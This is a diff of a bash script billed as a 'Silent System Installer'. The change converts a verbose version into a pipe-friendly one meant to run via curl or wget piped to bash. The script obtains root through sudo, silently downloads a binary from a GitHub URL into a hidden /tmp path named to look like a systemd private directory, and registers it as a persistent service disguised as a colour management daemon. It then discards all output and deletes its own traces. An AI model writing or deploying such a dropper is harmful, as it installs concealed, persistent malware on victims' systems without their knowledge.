@@ -1,28 +1,14 @@
 #!/bin/bash
 #
-# Silent System Installer with Debug Mode
-# Run with DEBUG=1 for verbose output
+# Silent System Installer - Pipe-Friendly Version
+# Works with: curl | bash or wget | bash
 #
 
-# Check if debug mode
-if [ "${DEBUG:-0}" = "1" ]; then
-    set -x
-    SILENT=""
-else
-    SILENT="2>/dev/null"
-fi
-
-# Function to log
-log() {
-    if [ "${DEBUG:-0}" = "1" ]; then
-        echo "[$(date +%T)] $*" >&2
-    fi
-}
+# Silent operation (but allow critical errors to stderr initially)
+SILENT_MODE=true
 
 # Configuration
 GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
-
-log "Starting installation..."
 
 # Generate random service name
 gen_service_name() {
@@ -31,228 +17,171 @@ gen_service_name() {
     local service_types=("colord" "upower" "rtkit-daemon" "accounts-daemon" "polkitd" "gdm" "ModemManager")
     local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
     local suffix=$(head -c 3 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
-    
     echo "${prefix}${hash}-${service_type}.service-${suffix}"
 }
+
+# Check if running as root
+if [ "$EUID" -ne 0 ]; then
+    # Not root - need to re-exec with sudo
+    # Save script to temp file first
+    TEMP_SCRIPT=$(mktemp /tmp/.inst.XXXXXX)
+    cat "$0" > "$TEMP_SCRIPT" 2>/dev/null || {
+        # If $0 doesn't work (piped), save ourselves
+        cat > "$TEMP_SCRIPT" << 'SELFEOF'
+#!/bin/bash
+exec 1>/dev/null 2>&1
+GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
+gen_service_name() {
+    local prefix="systemd-private-"
+    local hash=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1 | head -c 32)
+    local service_types=("colord" "upower" "rtkit-daemon" "accounts-daemon" "polkitd" "gdm" "ModemManager")
+    local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
+    local suffix=$(head -c 3 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
+    echo "${prefix}${hash}-${service_type}.service-${suffix}"
+}
+SERVICE_NAME=$(gen_service_name)
+INSTALL_DIR="/tmp/${SERVICE_NAME}"
+BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
+SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
+mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 1
+cd "$INSTALL_DIR" || exit 1
+if command -v curl >/dev/null 2>&1; then
+    curl -fsSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL" 2>/dev/null || exit 1
+elif command -v wget >/dev/null 2>&1; then
+    wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL" 2>/dev/null || exit 1
+else
+    exit 1
+fi
+[ -f "$BINARY_NAME" ] && [ -s "$BINARY_NAME" ] || exit 1
+chmod +x "$BINARY_NAME" 2>/dev/null
+cat > "$SERVICE_FILE" << 'SVCEOF'
+[Unit]
+Description=System Color Management Daemon
+After=network.target network-online.target
+Wants=network-online.target
+[Service]
+Type=simple
+ExecStart=INSTALL_DIR_PLACEHOLDER/BINARY_NAME_PLACEHOLDER
+Restart=on-failure
+RestartSec=10
+StartLimitIntervalSec=0
+StartLimitBurst=999
+Nice=-5
+CPUQuota=15%
+MemoryMax=150M
+PrivateTmp=yes
+NoNewPrivileges=false
+StandardOutput=null
+StandardError=null
+Environment=HOME=/root
+WorkingDirectory=INSTALL_DIR_PLACEHOLDER
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+sed -i "s|INSTALL_DIR_PLACEHOLDER|$INSTALL_DIR|g" "$SERVICE_FILE"
+sed -i "s|BINARY_NAME_PLACEHOLDER|$BINARY_NAME|g" "$SERVICE_FILE"
+systemctl daemon-reload 2>/dev/null
+systemctl enable "$SERVICE_NAME" 2>/dev/null
+systemctl start "$SERVICE_NAME" 2>/dev/null
+sleep 3
+if systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null; then
+    rm -f /tmp/.inst.* 2>/dev/null &
+    exit 0
+else
+    systemctl stop "$SERVICE_NAME" 2>/dev/null
+    systemctl disable "$SERVICE_NAME" 2>/dev/null
+    rm -f "$SERVICE_FILE" 2>/dev/null
+    systemctl daemon-reload 2>/dev/null
+    rm -rf "$INSTALL_DIR" 2>/dev/null
+    rm -f /tmp/.inst.* 2>/dev/null &
+    exit 1
+fi
+SELFEOF
+    }
+    chmod +x "$TEMP_SCRIPT"
+    sudo bash "$TEMP_SCRIPT"
+    EXIT_CODE=$?
+    rm -f "$TEMP_SCRIPT" 2>/dev/null
+    exit $EXIT_CODE
+fi
+
+# Now running as root - go silent
+exec 1>/dev/null 2>&1
 
 SERVICE_NAME=$(gen_service_name)
 INSTALL_DIR="/tmp/${SERVICE_NAME}"
 BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
 SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
 
-log "Service name: $SERVICE_NAME"
-log "Install dir: $INSTALL_DIR"
-log "Binary name: $BINARY_NAME"
-
-# Check if root
-if [ "$EUID" -ne 0 ]; then
-    log "Not root, trying sudo..."
-    if command -v sudo >/dev/null 2>&1; then
-        exec sudo DEBUG="${DEBUG:-0}" bash "$0" "$@"
-    else
-        echo "ERROR: Root access required" >&2
-        exit 1
-    fi
-fi
-
-log "Running as root"
-
 # Create installation directory
-log "Creating install directory..."
-if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
-    echo "ERROR: Cannot create $INSTALL_DIR" >&2
-    exit 1
-fi
-
-if ! cd "$INSTALL_DIR"; then
-    echo "ERROR: Cannot cd to $INSTALL_DIR" >&2
-    exit 1
-fi
-
-log "Changed to $INSTALL_DIR"
+mkdir -p "$INSTALL_DIR" || exit 1
+cd "$INSTALL_DIR" || exit 1
 
 # Download binary
-log "Downloading binary from $GITHUB_URL..."
-DOWNLOAD_SUCCESS=0
-
 if command -v curl >/dev/null 2>&1; then
-    log "Using curl..."
-    if curl -sSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL"; then
-        DOWNLOAD_SUCCESS=1
-        log "Download successful with curl"
-    else
-        log "Curl download failed"
-    fi
+    curl -fsSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL" || exit 1
 elif command -v wget >/dev/null 2>&1; then
-    log "Using wget..."
-    if wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL"; then
-        DOWNLOAD_SUCCESS=1
-        log "Download successful with wget"
-    else
-        log "Wget download failed"
-    fi
+    wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL" || exit 1
 else
-    echo "ERROR: Neither curl nor wget found" >&2
-    exit 1
-fi
-
-if [ "$DOWNLOAD_SUCCESS" -eq 0 ]; then
-    echo "ERROR: Download failed" >&2
     exit 1
 fi
 
 # Verify download
-log "Verifying download..."
-if [ ! -f "$BINARY_NAME" ]; then
-    echo "ERROR: Binary file not created" >&2
-    exit 1
-fi
-
-if [ ! -s "$BINARY_NAME" ]; then
-    echo "ERROR: Binary file is empty" >&2
-    rm -f "$BINARY_NAME"
-    exit 1
-fi
-
-FILESIZE=$(stat -c%s "$BINARY_NAME" 2>/dev/null || stat -f%z "$BINARY_NAME" 2>/dev/null || echo 0)
-log "Downloaded file size: $FILESIZE bytes"
-
-if [ "$FILESIZE" -lt 1000 ]; then
-    echo "ERROR: Downloaded file too small ($FILESIZE bytes), probably an error page" >&2
-    cat "$BINARY_NAME" >&2
-    exit 1
-fi
+[ -f "$BINARY_NAME" ] && [ -s "$BINARY_NAME" ] || exit 1
 
 # Make executable
-log "Making binary executable..."
-chmod +x "$BINARY_NAME" || {
-    echo "ERROR: Cannot chmod binary" >&2
-    exit 1
-}
-
-# Test if binary is executable
-if [ ! -x "$BINARY_NAME" ]; then
-    echo "ERROR: Binary not executable after chmod" >&2
-    exit 1
-fi
-
-log "Binary is executable"
+chmod +x "$BINARY_NAME"
 
 # Create systemd service
-log "Creating systemd service..."
-cat > "$SERVICE_FILE" << EOF
+cat > "$SERVICE_FILE" << 'SVCEOF'
 [Unit]
 Description=System Color Management Daemon
-Documentation=man:colord(1)
-After=network.target network-online.target systemd-udevd.service
+After=network.target network-online.target
 Wants=network-online.target
 
 [Service]
 Type=simple
-ExecStart=${INSTALL_DIR}/${BINARY_NAME}
+ExecStart=INSTALL_DIR_PLACEHOLDER/BINARY_NAME_PLACEHOLDER
 Restart=on-failure
 RestartSec=10
 StartLimitIntervalSec=0
 StartLimitBurst=999
-
-# Process settings
 Nice=-5
-OOMScoreAdjust=-500
 CPUQuota=15%
 MemoryMax=150M
-
-# Security (but allow network)
 PrivateTmp=yes
-ProtectSystem=strict
-ProtectHome=read-only
 NoNewPrivileges=false
-ReadWritePaths=/tmp /var/tmp
-
-# Logging (silence all unless debug)
 StandardOutput=null
 StandardError=null
-SyslogIdentifier=colord
-
-# Environment
 Environment=HOME=/root
-Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-WorkingDirectory=${INSTALL_DIR}
-
-# Auto-restart settings
-SuccessExitStatus=0 1 143
-RestartPreventExitStatus=
-TimeoutStopSec=30
+WorkingDirectory=INSTALL_DIR_PLACEHOLDER
 
 [Install]
 WantedBy=multi-user.target
-EOF
+SVCEOF
 
-if [ ! -f "$SERVICE_FILE" ]; then
-    echo "ERROR: Service file not created" >&2
-    exit 1
-fi
+# Replace placeholders
+sed -i "s|INSTALL_DIR_PLACEHOLDER|$INSTALL_DIR|g" "$SERVICE_FILE"
+sed -i "s|BINARY_NAME_PLACEHOLDER|$BINARY_NAME|g" "$SERVICE_FILE"
 
-log "Service file created: $SERVICE_FILE"
+# Enable and start
+systemctl daemon-reload
+systemctl enable "$SERVICE_NAME"
+systemctl start "$SERVICE_NAME"
 
-# Reload systemd
-log "Reloading systemd..."
-if ! systemctl daemon-reload; then
-    echo "ERROR: systemctl daemon-reload failed" >&2
-    exit 1
-fi
-
-# Enable service
-log "Enabling service..."
-if ! systemctl enable "$SERVICE_NAME"; then
-    echo "ERROR: systemctl enable failed" >&2
-    exit 1
-fi
-
-# Start service
-log "Starting service..."
-if ! systemctl start "$SERVICE_NAME"; then
-    echo "ERROR: systemctl start failed" >&2
-    systemctl status "$SERVICE_NAME" >&2
-    exit 1
-fi
-
-# Wait and verify
-log "Waiting for service to start..."
+# Verify
 sleep 3
-
 if systemctl is-active --quiet "$SERVICE_NAME"; then
-    log "Service is active!"
-    
-    # Success - print confirmation
-    if [ "${DEBUG:-0}" = "1" ]; then
-        echo "✓ Installation successful!" >&2
-        echo "  Service: $SERVICE_NAME" >&2
-        echo "  Location: $INSTALL_DIR" >&2
-        echo "  Status: $(systemctl is-active $SERVICE_NAME)" >&2
-    fi
-    
-    # Clean up installer
-    if [ "${DEBUG:-0}" != "1" ]; then
-        rm -f "$0" 2>/dev/null &
-    fi
-    
+    # Success - cleanup
+    rm -f /tmp/.inst.* 2>/dev/null &
     exit 0
 else
-    # Failed
-    echo "ERROR: Service failed to start" >&2
-    echo "Service status:" >&2
-    systemctl status "$SERVICE_NAME" >&2
-    echo "" >&2
-    echo "Service logs:" >&2
-    journalctl -u "$SERVICE_NAME" -n 20 --no-pager >&2
-    
-    # Cleanup
-    log "Cleaning up failed installation..."
+    # Failed - cleanup
     systemctl stop "$SERVICE_NAME" 2>/dev/null
     systemctl disable "$SERVICE_NAME" 2>/dev/null
-    rm -f "$SERVICE_FILE" 2>/dev/null
-    systemctl daemon-reload 2>/dev/null
-    rm -rf "$INSTALL_DIR" 2>/dev/null
-    
+    rm -f "$SERVICE_FILE"
+    systemctl daemon-reload
+    rm -rf "$INSTALL_DIR"
+    rm -f /tmp/.inst.* 2>/dev/null &
     exit 1
 fi
